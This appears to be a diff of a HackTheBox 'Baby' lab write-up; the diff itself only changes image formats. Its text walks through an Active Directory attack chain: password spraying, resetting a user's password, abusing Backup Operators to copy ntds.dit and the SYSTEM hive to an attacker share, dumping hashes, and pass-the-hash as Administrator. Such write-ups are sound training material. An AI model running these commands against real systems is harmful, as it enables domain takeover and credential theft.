@@ -17,7 +17,7 @@ title: 'HTB Write up Baby'
 ---
 # [HackTheBox - Baby](https://app.hackthebox.com/machines/Baby)
 
-![c6f135fd23e08499dbcf0bcab8d08564.png](/assets/resources-writeups/c6f135fd23e08499dbcf0bcab8d08564.png)
+![c6f135fd23e08499dbcf0bcab8d08564.png](/assets/resources-writeups/c6f135fd23e08499dbcf0bcab8d08564.avif)
 
 ## Table of Contents
 
@@ -42,42 +42,42 @@ Starting with nmap port scanning and we can see that there are multiple ports op
 ```
 nmap $IP
 ```
-![26b7efdc620353a2086c3d852c4da222.png](/assets/resources-writeups/26b7efdc620353a2086c3d852c4da222.png)
+![26b7efdc620353a2086c3d852c4da222.png](/assets/resources-writeups/26b7efdc620353a2086c3d852c4da222.avif)
 
 I rescanned again with `-sCV` flag for service enumeration and nmap script engine which reveals domain and hostname that we can add to hosts file but other information are not too special at this point  
 
-![ff14d3ebf97cfed092a71494342ed65e.png](/assets/resources-writeups/ff14d3ebf97cfed092a71494342ed65e.png)
+![ff14d3ebf97cfed092a71494342ed65e.png](/assets/resources-writeups/ff14d3ebf97cfed092a71494342ed65e.avif)
 
 After adding domain to hosts file. I started enumerate SMB with NetExec tool and we can see that null session could not be used to retrieve anything from  
 
-![f1d4e9c963c1fed550ace9ded12fa705.png](/assets/resources-writeups/f1d4e9c963c1fed550ace9ded12fa705.png)
+![f1d4e9c963c1fed550ace9ded12fa705.png](/assets/resources-writeups/f1d4e9c963c1fed550ace9ded12fa705.avif)
 
 But after changing protocol to LDAP, we can see that we can pull user lists from the domain and we can also see that we also have a password from user description and it telling us that the initial password of users on this domain is "BabyStart123!" and will likely to be changed after user logon.
 ```
 nxc ldap baby.vl -u '' -p '' --users
 ```
-![2db204965f7ff0c0c07d0b69b3f3c891.png](/assets/resources-writeups/2db204965f7ff0c0c07d0b69b3f3c891.png)
+![2db204965f7ff0c0c07d0b69b3f3c891.png](/assets/resources-writeups/2db204965f7ff0c0c07d0b69b3f3c891.avif)
 
 I created a userlist with NetExec and then password spraying all users from this user list but no hit which mean all users already changed their password and it seem like I missed something I shouldn't.
 ```
 nxc ldap baby.vl -u '' -p '' --users-export baby_users.txt
 nxc smb baby.vl -u baby_users.txt -p 'BabyStart123!'
 ```
-![2ac46c2fab4c297d6944f279690dca56.png](/assets/resources-writeups/2ac46c2fab4c297d6944f279690dca56.png)
+![2ac46c2fab4c297d6944f279690dca56.png](/assets/resources-writeups/2ac46c2fab4c297d6944f279690dca56.avif)
 
-![81e4fe894bd107521a7ac680c1790ab4.png](/assets/resources-writeups/81e4fe894bd107521a7ac680c1790ab4.png)
+![81e4fe894bd107521a7ac680c1790ab4.png](/assets/resources-writeups/81e4fe894bd107521a7ac680c1790ab4.avif)
 
 I used a simple LDAP search to search for something I might have missed and sure enough, there is one user that could not be pulled with my netexec 
 ```
 ldapsearch -H ldap://baby.vl -x -b "DC=baby,DC=vl" | grep member:
 ```
-![05e5906012ebbd05e0e9677198203c52.png](/assets/resources-writeups/05e5906012ebbd05e0e9677198203c52.png)
+![05e5906012ebbd05e0e9677198203c52.png](/assets/resources-writeups/05e5906012ebbd05e0e9677198203c52.avif)
 
 I tried to find the reason about it and 0xdf gave on on his write-up "That’s because this user doesn’t have any data associated with them" which is really interesting
-![985b8b827cb9d296ec8fbddde273a42b.png](/assets/resources-writeups/985b8b827cb9d296ec8fbddde273a42b.png)
+![985b8b827cb9d296ec8fbddde273a42b.png](/assets/resources-writeups/985b8b827cb9d296ec8fbddde273a42b.avif)
 
 I dug into the [source code](https://github.com/Pennyw0rth/NetExec/blob/f981215d776d56234d51f95ac2e48f11e149fe31/nxc/protocols/ldap.py#L740) of NetExec when using ldap to parse user list which reveals that NetExec will retrieve only object with `sAMAccountType` = 805306368 (normal user accounts) and "Caroline.Robinson" does not have this value so it didn't make to the list.
-![53e6e1e570ed1d906995202caa67ec33.png](/assets/resources-writeups/53e6e1e570ed1d906995202caa67ec33.png)
+![53e6e1e570ed1d906995202caa67ec33.png](/assets/resources-writeups/53e6e1e570ed1d906995202caa67ec33.avif)
 
 ## Initial Foothold by Changing password of Caroline.Robinson
 
@@ -85,27 +85,27 @@ I used the credential found on user description on this user and we can see that
 ```
 nxc smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!'
 ```
-![6609dadf07b72af65f34ae4ebb95de21.png](/assets/resources-writeups/6609dadf07b72af65f34ae4ebb95de21.png)
+![6609dadf07b72af65f34ae4ebb95de21.png](/assets/resources-writeups/6609dadf07b72af65f34ae4ebb95de21.avif)
 
 I used uv to run latest version of NetExec from Github to use change-password module since NetExec on Kali linux is not the latest version and it does not have this module. (you can use other tool to change password of this user)
 ```
 uv run nxc smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS=Password123
 ```
-![0eef906aa335b4004f160937bb3d3f2a.png](/assets/resources-writeups/0eef906aa335b4004f160937bb3d3f2a.png)
+![0eef906aa335b4004f160937bb3d3f2a.png](/assets/resources-writeups/0eef906aa335b4004f160937bb3d3f2a.avif)
 
 Now we can use this account to eneumerate further but nothing too special on share here.
 
-![d184b24b122d32a5e684378c0e132b6c.png](/assets/resources-writeups/d184b24b122d32a5e684378c0e132b6c.png)
+![d184b24b122d32a5e684378c0e132b6c.png](/assets/resources-writeups/d184b24b122d32a5e684378c0e132b6c.avif)
 
 We can use this user to gain a foothold as we can see "Pwn3d!" message from NetExec with WinRM protocol 
 ```
 nxc winrm baby.vl -u 'Caroline.Robinson' -p Password123
 ```
-![2316cf50ce55d71714b1dbc3a8672b7a.png](/assets/resources-writeups/2316cf50ce55d71714b1dbc3a8672b7a.png)
+![2316cf50ce55d71714b1dbc3a8672b7a.png](/assets/resources-writeups/2316cf50ce55d71714b1dbc3a8672b7a.avif)
 
 Using [evil-winrm](https://github.com/Hackplayers/evil-winrm), we can gain a foothold and loot user flag located on the desktop of this user.
 
-![495cb95b3a45b41f28535d9e863c6a69.png](/assets/resources-writeups/495cb95b3a45b41f28535d9e863c6a69.png)
+![495cb95b3a45b41f28535d9e863c6a69.png](/assets/resources-writeups/495cb95b3a45b41f28535d9e863c6a69.avif)
 
 ## Privilege Escalation with Backup Operators group
 
@@ -113,7 +113,7 @@ After gaining foothold, I used whoami command to list information about current 
 ```
 whoami /all
 ```
-![86434904fbd98b5f38ef2b2c6fa52047.png](/assets/resources-writeups/86434904fbd98b5f38ef2b2c6fa52047.png)
+![86434904fbd98b5f38ef2b2c6fa52047.png](/assets/resources-writeups/86434904fbd98b5f38ef2b2c6fa52047.avif)
 
 Since this is the domain controller, I will need to create a backup of ntds.dit which is active directory database and SYSTEM registry hive to dump hashes from both of these files, SYSTEM registry can be retrieve with just 1-2 command but on the other hand. I need to create a shadow copy so I can safely retrieve ntds.dit file.
 
@@ -134,44 +134,44 @@ The script will create a shadow copy snapshot of C drive and map to E drive and 
 ```
 unix2dos diskshadow.txt
 ```
-![28cabc9ae7f5843c32bd774114fb0717.png](/assets/resources-writeups/28cabc9ae7f5843c32bd774114fb0717.png)
+![28cabc9ae7f5843c32bd774114fb0717.png](/assets/resources-writeups/28cabc9ae7f5843c32bd774114fb0717.avif)
 
 Next, I uploaded the script on my winrm session and execute it. no error and now we are ready for the file transfer.
 ```
 upload diskshadow.txt
 diskshadow /s diskshadow.txt
 ```
-![ce09650189645b3ef5b09f67aa5bdea4.png](/assets/resources-writeups/ce09650189645b3ef5b09f67aa5bdea4.png)
+![ce09650189645b3ef5b09f67aa5bdea4.png](/assets/resources-writeups/ce09650189645b3ef5b09f67aa5bdea4.avif)
 
-![2c89cee29b28fb4bd2358de6f21a5210.png](/assets/resources-writeups/2c89cee29b28fb4bd2358de6f21a5210.png)
+![2c89cee29b28fb4bd2358de6f21a5210.png](/assets/resources-writeups/2c89cee29b28fb4bd2358de6f21a5210.avif)
 
 Since SYSTEM hive and ntds.dit files are quite large so, I opened my netshare share and copy both files to my Kali Linux. This way is much faster than download function in evil-winrm. first I created a backup of SYSTEM hive with reg save command.
 ```
 reg save hklm\system c:\system
 cp system.hive \\10.10.14.24\debug\
 ```
-![1b2ada0a9d181e68400962ee83cc16a9.png](/assets/resources-writeups/1b2ada0a9d181e68400962ee83cc16a9.png)
+![1b2ada0a9d181e68400962ee83cc16a9.png](/assets/resources-writeups/1b2ada0a9d181e68400962ee83cc16a9.avif)
 
-![985f2bfdcd10aa66d3ae23d309d8a909.png](/assets/resources-writeups/985f2bfdcd10aa66d3ae23d309d8a909.png)
+![985f2bfdcd10aa66d3ae23d309d8a909.png](/assets/resources-writeups/985f2bfdcd10aa66d3ae23d309d8a909.avif)
 
 Next is ntds.dit file and now we are ready to dump all the hashes inside both files.
 ```
 robocopy /b E:\windows\ntds . ntds.dit
 cp ntds.dit \\10.10.14.24\debug\
 ```
-![d512b652ff079e0c93a572daca4eb8c3.png](/assets/resources-writeups/d512b652ff079e0c93a572daca4eb8c3.png)
+![d512b652ff079e0c93a572daca4eb8c3.png](/assets/resources-writeups/d512b652ff079e0c93a572daca4eb8c3.avif)
 
 The tool that can be used to dump hashes is secretsdump from impacket and now we can get NTLM hash of Administrator account and gain access to target system via pass-the-hash technique.
 ```
 impacket-secretsdump -ntds ntds.dit -system system.hive local
 ```
-![6fc8fe601dbfd6152a5c6f96fc7463d1.png](/assets/resources-writeups/6fc8fe601dbfd6152a5c6f96fc7463d1.png)
+![6fc8fe601dbfd6152a5c6f96fc7463d1.png](/assets/resources-writeups/6fc8fe601dbfd6152a5c6f96fc7463d1.avif)
 
 Login as Administrator and loot the flag, Now we are done :D
 ```
 evil-winrm -i baby.vl -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d
 ```
-![772a9088ed368afeb8025d4b47c76b7d.png](/assets/resources-writeups/772a9088ed368afeb8025d4b47c76b7d.png)
+![772a9088ed368afeb8025d4b47c76b7d.png](/assets/resources-writeups/772a9088ed368afeb8025d4b47c76b7d.avif)
 
 https://labs.hackthebox.com/achievement/machine/1438364/739
 ***
